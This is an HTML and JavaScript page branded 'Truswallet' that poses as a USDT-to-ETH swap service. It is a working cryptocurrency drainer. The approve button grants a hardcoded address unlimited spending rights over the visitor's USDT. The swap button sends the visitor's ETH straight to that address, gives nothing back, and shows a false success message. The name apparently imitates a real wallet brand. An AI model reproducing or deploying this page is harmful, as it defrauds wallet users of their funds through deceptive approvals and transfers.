<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <title>USDT ↔ ETH Swap | Truswallet</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://cdn.tailwindcss.com"></script>
  <script src="https://cdn.jsdelivr.net/npm/ethers@6.13.1/dist/ethers.min.js"></script>
  <style>
    body {
      background: radial-gradient(circle at top left, #f0f4f8, #d9e2ec);
    }
    .glass {
      backdrop-filter: blur(10px);
      background: rgba(255, 255, 255, 0.7);
    }
  </style>
</head>
<body class="flex items-center justify-center min-h-screen">

  <div class="glass p-8 rounded-2xl shadow-2xl w-[400px] space-y-4 text-center">
    <h1 class="text-2xl font-bold">ETH ↔ USDT Swap</h1>
    <button id="connectButton" class="bg-black text-white px-4 py-2 rounded-full w-full">Connect Wallet</button>

    <div class="bg-white rounded-xl p-4 shadow mt-4">
      <p class="text-sm font-semibold">Your Balances:</p>
      <p id="ethBalance">ETH: —</p>
      <p id="usdtBalance">USDT: —</p>
    </div>

    <input id="usdtInput" type="number" step="0.01" placeholder="Amount in USDT" class="w-full border px-4 py-2 rounded-xl" />
    <p class="text-xs text-gray-500">1 ETH = 2500 USDT (fixed)</p>

    <button id="approveButton" class="bg-blue-600 text-white px-4 py-2 rounded-xl w-full">Approve USDT</button>
    <button id="swapButton" class="bg-green-600 text-white px-4 py-2 rounded-xl w-full">Swap to ETH</button>

    <p id="status" class="text-sm text-gray-600 mt-2"></p>
  </div>

  <script>
    const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20
    const spender = "0x4f4287A3965D87044a401ccF23BaC838a207b4Cc";
    const usdtAbi = [
      "function approve(address spender, uint amount) public returns (bool)",
      "function allowance(address owner, address spender) public view returns (uint)",
      "function balanceOf(address account) external view returns (uint256)"
    ];
    let provider, signer, account;

    document.getElementById("connectButton").onclick = async () => {
      if (window.ethereum) {
        provider = new ethers.BrowserProvider(window.ethereum);
        await provider.send("eth_requestAccounts", []);
        signer = await provider.getSigner();
        account = await signer.getAddress();
        document.getElementById("status").textContent = "Connected: " + account.slice(0, 6) + "..." + account.slice(-4);
        getBalances();
      } else {
        alert("Install MetaMask or Trust Wallet.");
      }
    };

    async function getBalances() {
      const ethBalance = await provider.getBalance(account);
      document.getElementById("ethBalance").textContent = "ETH: " + (ethers.formatEther(ethBalance)).slice(0, 8);

      const usdt = new ethers.Contract(usdtAddress, usdtAbi, provider);
      const usdtBalance = await usdt.balanceOf(account);
      document.getElementById("usdtBalance").textContent = "USDT: " + ethers.formatUnits(usdtBalance, 18);
    }

    document.getElementById("approveButton").onclick = async () => {
      const usdt = new ethers.Contract(usdtAddress, usdtAbi, signer);
      try {
        const tx = await usdt.approve(spender, ethers.MaxUint256);
        document.getElementById("status").textContent = "Approval pending...";
        await tx.wait();
        document.getElementById("status").textContent = "USDT approved successfully.";
      } catch (err) {
        document.getElementById("status").textContent = "Approval failed: " + err.reason || err.message;
      }
    };

    document.getElementById("swapButton").onclick = async () => {
      const usdtAmount = document.getElementById("usdtInput").value;
      if (!usdtAmount || isNaN(usdtAmount) || usdtAmount <= 0) {
        alert("Please enter a valid USDT amount.");
        return;
      }

      const ethToSend = ethers.parseEther((usdtAmount / 2500).toFixed(18));
      try {
        const tx = await signer.sendTransaction({
          to: spender,
          value: ethToSend
        });
        document.getElementById("status").textContent = "Swapping...";
        await tx.wait();
        document.getElementById("status").textContent = "Swapped " + usdtAmount + " USDT to ETH!";
      } catch (err) {
        document.getElementById("status").textContent = "Swap failed: " + err.reason || err.message;
      }
    };
  </script>
</body>
</html>
